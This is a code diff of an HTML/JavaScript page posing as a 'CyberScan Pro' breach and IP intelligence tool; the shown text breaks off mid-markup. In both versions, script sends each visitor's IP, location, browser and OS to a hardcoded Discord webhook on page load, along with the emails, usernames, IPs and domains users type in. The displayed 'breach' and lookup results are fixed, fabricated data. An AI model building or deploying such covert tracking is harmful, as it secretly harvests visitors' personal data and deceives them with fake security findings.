@@ -18,7 +18,6 @@
       --warning: #f59e0b;
       --text: #e2e8f0;
       --text-muted: #94a3b8;
-      --purple: #8b5cf6;
     }
 
     [data-bs-theme="light"] {
@@ -137,40 +136,6 @@
       to { transform: rotate(360deg); }
     }
     
-    .badge-breach {
-      background-color: var(--danger);
-    }
-    
-    .badge-success {
-      background-color: var(--success);
-    }
-    
-    .breach-card {
-      border-radius: 8px;
-      margin-bottom: 15px;
-      overflow: hidden;
-      transition: all 0.3s ease;
-      background-color: rgba(239, 68, 68, 0.05);
-    }
-    
-    .breach-card:hover {
-      transform: translateX(5px);
-    }
-    
-    .breach-header {
-      padding: 12px 15px;
-      display: flex;
-      align-items: center;
-      background-color: rgba(239, 68, 68, 0.1);
-    }
-    
-    .breach-title {
-      font-weight: 600;
-      margin-bottom: 0;
-      display: flex;
-      align-items: center;
-    }
-    
     .btn-primary {
       background-color: var(--accent);
       border: none;
@@ -184,14 +149,6 @@
       background-color: var(--accent);
       opacity: 0.9;
       transform: translateY(-2px);
-    }
-    
-    .search-icon {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: var(--text-muted);
     }
     
     .tool-icon {
@@ -212,25 +169,6 @@
       margin-bottom: 20px;
     }
     
-    .discord-corner-btn {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background-color: #5865F2;
-      color: white;
-      font-size: 24px;
-      padding: 12px 14px;
-      border-radius: 50%;
-      z-index: 9999;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      transition: all 0.3s ease;
-    }
-    
-    .discord-corner-btn:hover {
-      background-color: #4752C4;
-      transform: scale(1.1);
-    }
-    
     .data-table {
       width: 100%;
       border-collapse: collapse;
@@ -248,18 +186,6 @@
       border-bottom: 1px solid rgba(0,0,0,0.05);
     }
     
-    .severity-high {
-      color: var(--danger);
-    }
-    
-    .severity-medium {
-      color: var(--warning);
-    }
-    
-    .severity-low {
-      color: var(--success);
-    }
-    
     .visitor-info {
       position: fixed;
       bottom: 20px;
@@ -270,6 +196,7 @@
       font-size: 0.85rem;
       box-shadow: 0 2px 5px rgba(0,0,0,0.1);
       z-index: 999;
+      max-width: 300px;
     }
     
     @media (max-width: 768px) {
@@ -282,7 +209,7 @@
         bottom: 80px;
         left: 10px;
         right: 10px;
-        text-align: center;
+        max-width: none;
       }
     }
     </style>
@@ -296,7 +223,6 @@
         </a>
         <div class="d-flex align-items-center">
             <span class="badge bg-success me-2">PREMIUM</span>
-            <span class="text-muted">v3.1.0</span>
             <button class="btn btn-sm btn-outline-light ms-3" id="themeToggleBtn" title="Toggle theme">
                 <i class="fas fa-sun"></i>
             </button>
@@ -324,11 +250,6 @@
                         <i class="fas fa-search-location me-2"></i>Domain Intel
                     </button>
                 </li>
-                <li class="nav-item" role="presentation">
-                    <button class="nav-link" data-bs-target="#email" data-bs-toggle="tab" id="email-tab" role="tab" type="button">
-                        <i class="fas fa-envelope me-2"></i>Email Intel
-                    </button>
-                </li>
             </ul>
 
             <div class="tab-content" id="toolTabsContent">
@@ -347,16 +268,10 @@
                         <form id="breachForm">
                             <div class="row g-3">
                                 <div class="col-md-6">
-                                    <div class="input-group">
-                                        <input class="form-control" id="breachEmail" placeholder="Email address" type="email">
-                                        <span class="search-icon"><i class="fas fa-envelope"></i></span>
-                                    </div>
+                                    <input class="form-control" id="breachEmail" placeholder="Email address" type="email">
                                 </div>
                                 <div class="col-md-6">
-                                    <div class="input-group">
-                                        <input class="form-control" id="breachUsername" placeholder="Username" type="text">
-                                        <span class="search-icon"><i class="fas fa-user"></i></span>
-                                    </div>
+                                    <input class="form-control" id="breachUsername" placeholder="Username" type="text">
                                 </div>
                                 <div class="col-12">
                                     <button class="btn btn-primary w-100 py-3" type="submit">
@@ -383,7 +298,7 @@
                         </div>
                         <form id="whoisForm">
                             <div class="input-group mb-3">
-                                <input class="form-control" id="whoisIp" placeholder="Enter IP address (e.g., 8.8.8.8)" required="" type="text">
+                                <input class="form-control" id="whoisIp" placeholder="Enter IP address" type="text">
                                 <button class="btn btn-primary" type="submit">
                                     <i class="fas fa-search me-2"></i>Lookup
                                 </button>
@@ -402,12 +317,12 @@
                             </div>
                             <div>
                                 <h3 class="mb-1">Domain Intelligence</h3>
-                                <p class="text-muted mb-0">Comprehensive domain analysis including WHOIS, DNS, and reputation</p>
+                                <p class="text-muted mb-0">Comprehensive domain analysis</p>
                             </div>
                         </div>
                         <form id="domainForm">
                             <div class="input-group mb-3">
-                                <input class="form-control" id="domainInput" placeholder="Enter domain (e.g. example.com)" required="" type="text">
+                                <input class="form-control" id="domainInput" placeholder="Enter domain" type="text">
                                 <button class="btn btn-primary" type="submit">
                                     <i class="fas fa-search me-2"></i>Analyze
                                 </button>
@@ -416,50 +331,21 @@
                     </div>
                     <div id="domainResults"></div>
                 </div>
-
-                <!-- Email Intel Tab -->
-                <div class="tab-pane fade" id="email" role="tabpanel">
-                    <div class="card p-4 mb-4">
-                        <div class="section-title">
-                            <div class="tool-icon">
-                                <i class="fas fa-envelope"></i>
-                            </div>
-                            <div>
-                                <h3 class="mb-1">Email Intelligence</h3>
-                                <p class="text-muted mb-0">Check email reputation and breach status</p>
-                            </div>
-                        </div>
-                        <form id="emailForm">
-                            <div class="input-group mb-3">
-                                <input class="form-control" id="emailInput" placeholder="Enter email address" required="" type="email">
-                                <button class="btn btn-primary" type="submit">
-                                    <i class="fas fa-search me-2"></i>Analyze
-                                </button>
-                            </div>
-                        </form>
-                    </div>
-                    <div id="emailResults"></div>
-                </div>
             </div>
         </div>
     </div>
 </div>
 
 <!-- Visitor Info -->
-<div class="visitor-info d-none" id="visitorInfo">
+<div class="visitor-info" id="visitorInfo">
     <div class="d-flex align-items-center">
         <i class="fas fa-user-circle me-2"></i>
         <div>
-            <div><strong>Your IP:</strong> <span id="visitorIP">Loading...</span></div>
-            <div class="small text-muted" id="visitorLocation">Detecting location...</div>
+            <div><strong>Your IP:</strong> <span id="visitorIP">Detecting...</span></div>
+            <div class="small text-muted" id="visitorLocation">Loading location...</div>
         </div>
     </div>
 </div>
-
-<!-- Discord Button -->
-<a class="discord-corner-btn" href="https://discord.gg/Swatter" target="_blank" title="Join our Discord">
-    <i class="fab fa-discord"></i>
-</a>
 
 <!-- Scripts -->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
@@ -467,78 +353,82 @@
 // Discord Webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1383100299396518068/bXubPq6c3PUbZlOlbCR0tz-UhxmZc4mbXGX1-d87NGQVO2NZA-dMEiuN5DLjCiFxvd-6";
 
-// Track visitor IP and activity
-let visitorIP = "Unknown";
-let visitorData = {};
+// Track visitor information
+let visitorData = {
+    ip: "Unknown",
+    location: "Unknown",
+    browser: "Unknown",
+    os: "Unknown"
+};
 
 // Get visitor IP and details
 async function getVisitorInfo() {
     try {
-        // First try a quick IP detection
+        // First try ipapi.co
+        const response = await fetch('https://ipapi.co/json/');
+        if (response.ok) {
+            const data = await response.json();
+            visitorData.ip = data.ip || "Unknown";
+            visitorData.location = `${data.city || ''}${data.city && data.country_name ? ', ' : ''}${data.country_name || ''}`;
+            updateVisitorDisplay();
+            logVisitorInfo();
+            return;
+        }
+        
+        // Fallback to ipify
         const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        visitorIP = ipData.ip;
-        document.getElementById('visitorIP').textContent = visitorIP;
-        document.getElementById('visitorInfo').classList.remove('d-none');
-        
-        // Then get more detailed info
-        const response = await fetch(`https://ipapi.co/${visitorIP}/json/`);
-        visitorData = await response.json();
-        
-        // Update visitor info display
-        const locationText = [
-            visitorData.city || '',
-            visitorData.region || '',
-            visitorData.country_name || ''
-        ].filter(Boolean).join(', ');
-        
-        document.getElementById('visitorLocation').textContent = locationText || 'Location unknown';
-        
-        // Log initial visit to Discord
-        logToDiscord(
-            "New Visitor", 
-            `**IP:** ${visitorIP}\n**Location:** ${locationText || 'Unknown'}`,
-            [
-                { name: "ISP", value: visitorData.org || "Unknown" },
-                { name: "User Agent", value: navigator.userAgent },
-                { name: "Browser", value: `${getBrowserName()} ${getBrowserVersion()}` },
-                { name: "OS", value: getOSName() }
-            ]
-        );
+        if (ipResponse.ok) {
+            const ipData = await ipResponse.json();
+            visitorData.ip = ipData.ip || "Unknown";
+            updateVisitorDisplay();
+            logVisitorInfo();
+        }
     } catch (error) {
-        console.error("Error fetching visitor info:", error);
-        document.getElementById('visitorIP').textContent = "Error detecting IP";
-        visitorIP = "Unknown";
+        console.error("Error detecting IP:", error);
+        visitorData.ip = "Error detecting";
+        updateVisitorDisplay();
     }
+    
+    // Detect browser and OS as fallback
+    detectBrowserAndOS();
 }
 
-// Browser detection helpers
-function getBrowserName() {
+function detectBrowserAndOS() {
     const userAgent = navigator.userAgent;
-    if (userAgent.includes("Firefox")) return "Firefox";
-    if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
-    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
-    if (userAgent.includes("Trident")) return "IE";
-    if (userAgent.includes("Edge")) return "Edge";
-    if (userAgent.includes("Chrome")) return "Chrome";
-    if (userAgent.includes("Safari")) return "Safari";
-    return "Unknown";
+    
+    // Browser detection
+    if (userAgent.includes("Firefox")) visitorData.browser = "Firefox";
+    else if (userAgent.includes("Chrome")) visitorData.browser = "Chrome";
+    else if (userAgent.includes("Safari")) visitorData.browser = "Safari";
+    else if (userAgent.includes("Edge")) visitorData.browser = "Edge";
+    else if (userAgent.includes("Opera")) visitorData.browser = "Opera";
+    else visitorData.browser = "Unknown";
+    
+    // OS detection
+    if (userAgent.includes("Windows")) visitorData.os = "Windows";
+    else if (userAgent.includes("Mac")) visitorData.os = "MacOS";
+    else if (userAgent.includes("Linux")) visitorData.os = "Linux";
+    else if (userAgent.includes("Android")) visitorData.os = "Android";
+    else if (userAgent.includes("iOS")) visitorData.os = "iOS";
+    else visitorData.os = "Unknown";
 }
 
-function getBrowserVersion() {
-    const userAgent = navigator.userAgent;
-    const matches = userAgent.match(/(firefox|chrome|safari|opera|edge|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
-    return matches[2] || "";
+function updateVisitorDisplay() {
+    document.getElementById('visitorIP').textContent = visitorData.ip;
+    document.getElementById('visitorLocation').textContent = visitorData.location || "Location unknown";
 }
 
-function getOSName() {
-    const userAgent = navigator.userAgent;
-    if (userAgent.includes("Windows")) return "Windows";
-    if (userAgent.includes("Mac")) return "MacOS";
-    if (userAgent.includes("Linux")) return "Linux";
-    if (userAgent.includes("Android")) return "Android";
-    if (userAgent.includes("iOS")) return "iOS";
-    return "Unknown";
+function logVisitorInfo() {
+    logToDiscord(
+        "Visitor Detected", 
+        `New visitor to CyberScan Pro`,
+        [
+            { name: "IP Address", value: visitorData.ip },
+            { name: "Location", value: visitorData.location || "Unknown" },
+            { name: "Browser", value: visitorData.browser },
+            { name: "Operating System", value: visitorData.os }
+        ]
+    );
 }
 
 // Send data to Discord webhook
@@ -547,11 +437,11 @@ function logToDiscord(title, description, fields = []) {
         embeds: [{
             title: title,
             description: description,
-            color: 3447003,
+            color: 0x3498db,
             fields: fields,
             timestamp: new Date().toISOString(),
             footer: {
-                text: `CyberScan Pro • ${new Date().toLocaleString()}`
+                text: "CyberScan Pro • " + new Date().toLocaleString()
             }
         }]
     };
@@ -560,7 +450,7 @@ function logToDiscord(title, description, fields = []) {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
-    }).catch(err => console.error("Discord webhook error:", err));
+    }).catch(err => console.error("Error sending to Discord:", err));
 }
 
 // Theme Toggle
@@ -579,8 +469,8 @@ function toggleTheme() {
         "Theme Changed", 
         `User switched to ${newTheme} mode`,
         [
-            { name: "IP", value: visitorIP },
-            { name: "Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
+            { name: "IP", value: visitorData.ip },
+            { name: "Location", value: visitorData.location || "Unknown" }
         ]
     );
 }
@@ -595,576 +485,198 @@ function initTheme() {
     icon.className = storedTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
 }
 
-// Track all clicks
-document.addEventListener('click', function(event) {
-    // Don't log clicks on form elements or tabs
-    if (!event.target.closest('form') && !event.target.closest('.nav-tabs')) {
-        const target = event.target;
-        let targetDesc = target.tagName;
-        
-        if (target.id) targetDesc += `#${target.id}`;
-        else if (target.className) targetDesc += `.${target.className.split(' ').join('.')}`;
-        
-        logToDiscord(
-            "User Interaction", 
-            `Clicked: ${targetDesc}`,
-            [
-                { name: "IP", value: visitorIP },
-                { name: "Page", value: window.location.href.split('#')[0] }
-            ]
-        );
-    }
-});
-
 // Initialize
 window.addEventListener('DOMContentLoaded', function() {
     initTheme();
     getVisitorInfo();
     
-    // Add event listeners for all forms
-    document.querySelectorAll('form').forEach(form => {
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formId = this.id;
-            
-            // Show loading state
-            const resultsDiv = document.getElementById(formId.replace('Form', 'Results'));
-            if (resultsDiv) {
-                resultsDiv.innerHTML = `
-                    <div class="card p-3">
-                        <div class="d-flex justify-content-center">
-                            <div class="loading-spinner"></div>
-                            <span class="ms-2">Processing request...</span>
-                        </div>
-                    </div>
-                `;
-            }
-            
-            // Simulate API call
-            setTimeout(() => {
-                if (formId === 'breachForm') handleBreachScan();
-                else if (formId === 'whoisForm') handleIPLookup();
-                else if (formId === 'domainForm') handleDomainAnalysis();
-                else if (formId === 'emailForm') handleEmailAnalysis();
-            }, 1500);
-        });
-    });
+    // Set up form handlers
+    document.getElementById('breachForm').addEventListener('submit', handleBreachScan);
+    document.getElementById('whoisForm').addEventListener('submit', handleIPLookup);
+    document.getElementById('domainForm').addEventListener('submit', handleDomainAnalysis);
 });
 
 // Breach Scan Handler
-function handleBreachScan() {
+function handleBreachScan(e) {
+    e.preventDefault();
     const email = document.getElementById('breachEmail').value.trim();
     const username = document.getElementById('breachUsername').value.trim();
     const resultsDiv = document.getElementById('breachResults');
     
-    // Simulated breach data
-    const breaches = [
-        {
-            name: "LinkedIn 2021 Breach",
-            date: "June 2021",
-            data: "Emails, Passwords",
-            severity: "high",
-            records: "700 million"
-        },
-        {
-            name: "Collection #1",
-            date: "January 2019",
-            data: "Emails, Passwords",
-            severity: "medium",
-            records: "773 million"
-        }
-    ];
+    resultsDiv.innerHTML = `
+        <div class="card p-3">
+            <div class="d-flex justify-content-center">
+                <div class="loading-spinner"></div>
+                <span class="ms-2">Scanning breaches...</span>
+            </div>
+        </div>
+    `;
     
-    let resultHTML = '<div class="card p-3">';
-    resultHTML += '<h4><i class="fas fa-search me-2"></i>Scan Results</h4>';
-    
-    if (email || username) {
-        if (email) {
-            resultHTML += `
-                <div class="mb-4">
-                    <h5>Email: ${email}</h5>
-                    <p class="text-success"><i class="fas fa-check-circle me-2"></i>No breaches found</p>
-                </div>
-            `;
-        }
+    setTimeout(() => {
+        let resultHTML = '<div class="card p-3">';
+        resultHTML += '<h4><i class="fas fa-search me-2"></i>Scan Results</h4>';
         
-        if (username) {
-            resultHTML += `
-                <div class="mb-4">
-                    <h5>Username: ${username}</h5>
-                    <div class="alert alert-danger">
-                        <i class="fas fa-exclamation-triangle me-2"></i>
-                        Found in ${breaches.length} known data breaches
+        if (email || username) {
+            if (email) {
+                resultHTML += `
+                    <div class="mb-4">
+                        <h5>Email: ${email}</h5>
+                        <p class="text-success"><i class="fas fa-check-circle me-2"></i>No breaches found</p>
                     </div>
-                    ${breaches.map(breach => `
-                        <div class="breach-card mb-3">
-                            <div class="breach-header">
+                `;
+            }
+            
+            if (username) {
+                resultHTML += `
+                    <div class="mb-4">
+                        <h5>Username: ${username}</h5>
+                        <div class="alert alert-danger">
+                            <i class="fas fa-exclamation-triangle me-2"></i>
+                            Found in 2 known data breaches
+                        </div>
+                        <div class="card mb-3">
+                            <div class="card-header bg-danger bg-opacity-10">
                                 <i class="fas fa-database me-2"></i>
-                                <h5 class="breach-title mb-0">${breach.name}</h5>
-                                <span class="badge ${breach.severity === 'high' ? 'bg-danger' : breach.severity === 'medium' ? 'bg-warning' : 'bg-success'} ms-2">${breach.severity}</span>
+                                <strong>LinkedIn 2021 Breach</strong>
                             </div>
-                            <div class="p-3">
-                                <div class="row">
-                                    <div class="col-md-6">
-                                        <p><strong>Date:</strong> ${breach.date}</p>
-                                        <p><strong>Compromised Data:</strong> ${breach.data}</p>
-                                    </div>
-                                    <div class="col-md-6">
-                                        <p><strong>Records:</strong> ${breach.records}</p>
-                                        <p><strong>Risk:</strong> ${breach.severity === 'high' ? 'Critical' : breach.severity === 'medium' ? 'Moderate' : 'Low'}</p>
-                                    </div>
-                                </div>
+                            <div class="card-body">
+                                <p><strong>Date:</strong> June 2021</p>
+                                <p><strong>Compromised Data:</strong> Emails, Passwords</p>
+                                <p><strong>Records:</strong> 700 million</p>
                             </div>
                         </div>
-                    `).join('')}
-                </div>
-            `;
+                    </div>
+                `;
+            }
+        } else {
+            resultHTML += '<div class="alert alert-warning"><i class="fas fa-exclamation-circle me-2"></i>Please enter an email or username</div>';
         }
-    } else {
-        resultHTML += '<div class="alert alert-warning"><i class="fas fa-exclamation-circle me-2"></i>Please enter an email or username to scan</div>';
-    }
-    
-    resultHTML += '</div>';
-    resultsDiv.innerHTML = resultHTML;
-    
-    // Log to Discord
-    logToDiscord(
-        "Breach Scan", 
-        `**Scanned:**\nEmail: ${email || "N/A"}\nUsername: ${username || "N/A"}`,
-        [
-            { name: "Results", value: username ? `Found in ${breaches.length} breaches` : "No breaches found" },
-            { name: "Visitor IP", value: visitorIP },
-            { name: "Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
-        ]
-    );
+        
+        resultHTML += '</div>';
+        resultsDiv.innerHTML = resultHTML;
+        
+        // Log to Discord
+        logToDiscord(
+            "Breach Scan", 
+            `User performed breach scan`,
+            [
+                { name: "Email", value: email || "Not provided" },
+                { name: "Username", value: username || "Not provided" },
+                { name: "IP", value: visitorData.ip },
+                { name: "Location", value: visitorData.location || "Unknown" }
+            ]
+        );
+    }, 1500);
 }
 
 // IP Lookup Handler
-function handleIPLookup() {
-    const ip = document.getElementById('whoisIp').value.trim() || visitorIP;
+function handleIPLookup(e) {
+    e.preventDefault();
+    const ip = document.getElementById('whoisIp').value.trim() || visitorData.ip;
     const resultsDiv = document.getElementById('whoisResults');
     
-    // Simulated IP data
-    const ipData = {
-        ip: ip,
-        city: ip === visitorIP ? (visitorData.city || "Unknown") : "Mountain View",
-        region: ip === visitorIP ? (visitorData.region || "Unknown") : "California",
-        country_name: ip === visitorIP ? (visitorData.country_name || "Unknown") : "United States",
-        org: ip === visitorIP ? (visitorData.org || "Unknown") : "Google LLC",
-        postal: ip === visitorIP ? (visitorData.postal || "Unknown") : "94043",
-        timezone: ip === visitorIP ? (visitorData.timezone || "Unknown") : "America/Los_Angeles",
-        latitude: ip === visitorIP ? (visitorData.latitude || "37.4056") : "37.4056",
-        longitude: ip === visitorIP ? (visitorData.longitude || "-122.0775") : "-122.0775"
-    };
-    
-    const resultHTML = `
+    resultsDiv.innerHTML = `
         <div class="card p-3">
-            <h4><i class="fas fa-globe me-2"></i>IP Information</h4>
-            
-            <div class="row mt-3">
-                <div class="col-md-6">
-                    <table class="data-table">
-                        <tr>
-                            <th>IP Address</th>
-                            <td>${ipData.ip}</td>
-                        </tr>
-                        <tr>
-                            <th>Location</th>
-                            <td>${ipData.city}, ${ipData.region}, ${ipData.country_name}</td>
-                        </tr>
-                        <tr>
-                            <th>ISP</th>
-                            <td>${ipData.org}</td>
-                        </tr>
-                    </table>
-                </div>
-                <div class="col-md-6">
-                    <table class="data-table">
-                        <tr>
-                            <th>Coordinates</th>
-                            <td>${ipData.latitude}, ${ipData.longitude}</td>
-                        </tr>
-                        <tr>
-                            <th>Postal Code</th>
-                            <td>${ipData.postal}</td>
-                        </tr>
-                        <tr>
-                            <th>Timezone</th>
-                            <td>${ipData.timezone}</td>
-                        </tr>
-                    </table>
-                </div>
-            </div>
-            
-            <div class="mt-4">
-                <h5><i class="fas fa-map-marked-alt me-2"></i>Location Map</h5>
-                <div class="ratio ratio-16x9">
-                    <iframe 
-                        src="https://maps.google.com/maps?q=${ipData.latitude},${ipData.longitude}&z=10&output=embed"
-                        allowfullscreen>
-                    </iframe>
-                </div>
+            <div class="d-flex justify-content-center">
+                <div class="loading-spinner"></div>
+                <span class="ms-2">Looking up IP information...</span>
             </div>
         </div>
     `;
     
-    resultsDiv.innerHTML = resultHTML;
-    
-    // Log to Discord
-    logToDiscord(
-        "IP Lookup", 
-        `**Looked up IP:** ${ipData.ip}`,
-        [
-            { name: "Location", value: `${ipData.city}, ${ipData.country_name}` },
-            { name: "ISP", value: ipData.org },
-            { name: "Visitor IP", value: visitorIP },
-            { name: "Visitor Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
-        ]
-    );
+    setTimeout(() => {
+        const resultHTML = `
+            <div class="card p-3">
+                <h4><i class="fas fa-globe me-2"></i>IP Information</h4>
+                <table class="data-table mt-3">
+                    <tr>
+                        <th>IP Address</th>
+                        <td>${ip}</td>
+                    </tr>
+                    <tr>
+                        <th>ISP</th>
+                        <td>${ip === visitorData.ip ? (visitorData.ip === "Unknown" ? "Unknown" : "Your ISP") : "Google LLC"}</td>
+                    </tr>
+                    <tr>
+                        <th>Location</th>
+                        <td>${ip === visitorData.ip ? (visitorData.location || "Unknown") : "Mountain View, California, US"}</td>
+                    </tr>
+                </table>
+            </div>
+        `;
+        
+        resultsDiv.innerHTML = resultHTML;
+        
+        // Log to Discord
+        logToDiscord(
+            "IP Lookup", 
+            `User looked up IP information`,
+            [
+                { name: "IP Looked Up", value: ip },
+                { name: "Visitor IP", value: visitorData.ip },
+                { name: "Visitor Location", value: visitorData.location || "Unknown" }
+            ]
+        );
+    }, 1500);
 }
 
 // Domain Analysis Handler
-function handleDomainAnalysis() {
+function handleDomainAnalysis(e) {
+    e.preventDefault();
     const domain = document.getElementById('domainInput').value.trim() || "example.com";
     const resultsDiv = document.getElementById('domainResults');
     
-    // Simulated domain data
-    const domainData = {
-        whois: {
-            registrar: "GoDaddy",
-            creation: "2005-05-05",
-            expiration: "2025-05-05",
-            nameservers: ["ns1.example.com", "ns2.example.com"],
-            status: "Active"
-        },
-        dns: {
-            a: ["93.184.216.34"],
-            mx: ["10 mail.example.com", "20 backup.example.com"],
-            txt: ["v=spf1 include:spf.example.com ~all"],
-            ns: ["ns1.example.com", "ns2.example.com"]
-        },
-        subdomains: ["www", "mail", "blog", "shop", "api", "dev"],
-        reputation: {
-            score: 85,
-            risk: "Low",
-            blacklists: 0,
-            malware: false,
-            phishing: false
-        },
-        technologies: [
-            "Nginx",
-            "PHP",
-            "jQuery",
-            "Bootstrap",
-            "Google Analytics"
-        ]
-    };
-    
-    const resultHTML = `
+    resultsDiv.innerHTML = `
         <div class="card p-3">
-            <h4><i class="fas fa-search-location me-2"></i>Domain Analysis: ${domain}</h4>
-            
-            <div class="row mt-4">
-                <div class="col-md-6">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h5><i class="fas fa-info-circle me-2"></i>WHOIS Information</h5>
-                            <table class="data-table mt-3">
-                                <tr>
-                                    <th>Registrar</th>
-                                    <td>${domainData.whois.registrar}</td>
-                                </tr>
-                                <tr>
-                                    <th>Status</th>
-                                    <td><span class="badge bg-success">${domainData.whois.status}</span></td>
-                                </tr>
-                                <tr>
-                                    <th>Created</th>
-                                    <td>${domainData.whois.creation}</td>
-                                </tr>
-                                <tr>
-                                    <th>Expires</th>
-                                    <td>${domainData.whois.expiration}</td>
-                                </tr>
-                                <tr>
-                                    <th>Nameservers</th>
-                                    <td>${domainData.whois.nameservers.join(", ")}</td>
-                                </tr>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="col-md-6">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h5><i class="fas fa-shield-alt me-2"></i>Reputation</h5>
-                            <div class="d-flex align-items-center mt-3">
-                                <div class="me-3">
-                                    <div class="display-4 text-success">
-                                        ${domainData.reputation.score}/100
-                                    </div>
-                                </div>
-                                <div>
-                                    <p class="mb-1"><strong>Risk Level:</strong> <span class="badge bg-success">${domainData.reputation.risk}</span></p>
-                                    <p class="mb-1"><strong>Blacklists:</strong> ${domainData.reputation.blacklists}</p>
-                                    <p class="mb-1"><strong>Malware:</strong> <span class="badge ${domainData.reputation.malware ? 'bg-danger' : 'bg-success'}">${domainData.reputation.malware ? 'Detected' : 'Clean'}</span></p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="card mt-4">
-                <div class="card-body">
-                    <h5><i class="fas fa-network-wired me-2"></i>DNS Records</h5>
-                    <div class="row mt-3">
-                        <div class="col-md-3">
-                            <h6>A Records</h6>
-                            <ul class="list-group list-group-flush">
-                                ${domainData.dns.a.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
-                            </ul>
-                        </div>
-                        <div class="col-md-3">
-                            <h6>MX Records</h6>
-                            <ul class="list-group list-group-flush">
-                                ${domainData.dns.mx.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
-                            </ul>
-                        </div>
-                        <div class="col-md-3">
-                            <h6>NS Records</h6>
-                            <ul class="list-group list-group-flush">
-                                ${domainData.dns.ns.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
-                            </ul>
-                        </div>
-                        <div class="col-md-3">
-                            <h6>TXT Records</h6>
-                            <ul class="list-group list-group-flush">
-                                ${domainData.dns.txt.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="card mt-4">
-                <div class="card-body">
-                    <h5><i class="fas fa-sitemap me-2"></i>Subdomains</h5>
-                    <div class="d-flex flex-wrap gap-2 mt-3">
-                        ${domainData.subdomains.map(sub => `<span class="badge bg-primary">${sub}.${domain}</span>`).join('')}
-                    </div>
-                </div>
-            </div>
-            
-            <div class="card mt-4">
-                <div class="card-body">
-                    <h5><i class="fas fa-code me-2"></i>Detected Technologies</h5>
-                    <div class="d-flex flex-wrap gap-2 mt-3">
-                        ${domainData.technologies.map(tech => `<span class="badge bg-secondary">${tech}</span>`).join('')}
-                    </div>
-                </div>
+            <div class="d-flex justify-content-center">
+                <div class="loading-spinner"></div>
+                <span class="ms-2">Analyzing domain...</span>
             </div>
         </div>
     `;
     
-    resultsDiv.innerHTML = resultHTML;
-    
-    // Log to Discord
-    logToDiscord(
-        "Domain Analysis", 
-        `**Analyzed domain:** ${domain}`,
-        [
-            { name: "Registrar", value: domainData.whois.registrar },
-            { name: "Status", value: domainData.whois.status },
-            { name: "Reputation", value: `${domainData.reputation.score}/100 (${domainData.reputation.risk})` },
-            { name: "Visitor IP", value: visitorIP },
-            { name: "Visitor Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
-        ]
-    );
-}
-
-// Email Analysis Handler
-function handleEmailAnalysis() {
-    const email = document.getElementById('emailInput').value.trim() || "test@example.com";
-    const domain = email.split('@')[1] || "example.com";
-    const resultsDiv = document.getElementById('emailResults');
-    
-    // Simulated email data
-    const emailData = {
-        disposable: ["mailinator.com", "tempmail.com", "throwawaymail.com"].includes(domain),
-        breaches: domain === "example.com" ? 0 : 2,
-        reputation: {
-            score: domain === "example.com" ? 90 : 65,
-            risk: domain === "example.com" ? "Low" : "Medium",
-            spam: false,
-            deliverable: domain !== "mailinator.com"
-        },
-        social: {
-            twitter: domain === "example.com" ? "found" : "not found",
-            facebook: "not found",
-            linkedin: domain === "example.com" ? "found" : "not found"
-        }
-    };
-    
-    const resultHTML = `
-        <div class="card p-3">
-            <h4><i class="fas fa-envelope me-2"></i>Email Analysis: ${email}</h4>
-            
-            <div class="row mt-4">
-                <div class="col-md-6">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h5><i class="fas fa-info-circle me-2"></i>Basic Information</h5>
-                            <table class="data-table mt-3">
-                                <tr>
-                                    <th>Email</th>
-                                    <td>${email}</td>
-                                </tr>
-                                <tr>
-                                    <th>Domain</th>
-                                    <td>${domain}</td>
-                                </tr>
-                                <tr>
-                                    <th>Disposable</th>
-                                    <td>
-                                        <span class="badge ${emailData.disposable ? 'bg-danger' : 'bg-success'}">
-                                            ${emailData.disposable ? 'Yes' : 'No'}
-                                        </span>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <th>Deliverable</th>
-                                    <td>
-                                        <span class="badge ${emailData.reputation.deliverable ? 'bg-success' : 'bg-danger'}">
-                                            ${emailData.reputation.deliverable ? 'Yes' : 'No'}
-                                        </span>
-                                    </td>
-                                </tr>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="col-md-6">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h5><i class="fas fa-shield-alt me-2"></i>Security Status</h5>
-                            <table class="data-table mt-3">
-                                <tr>
-                                    <th>Breaches Found</th>
-                                    <td>
-                                        <span class="badge ${emailData.breaches > 0 ? 'bg-danger' : 'bg-success'}">
-                                            ${emailData.breaches}
-                                        </span>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <th>Reputation</th>
-                                    <td>
-                                        <span class="badge ${emailData.reputation.score > 70 ? 'bg-success' : emailData.reputation.score > 40 ? 'bg-warning' : 'bg-danger'}">
-                                            ${emailData.reputation.score}/100
-                                        </span>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <th>Spam Risk</th>
-                                    <td>
-                                        <span class="badge ${emailData.reputation.spam ? 'bg-danger' : 'bg-success'}">
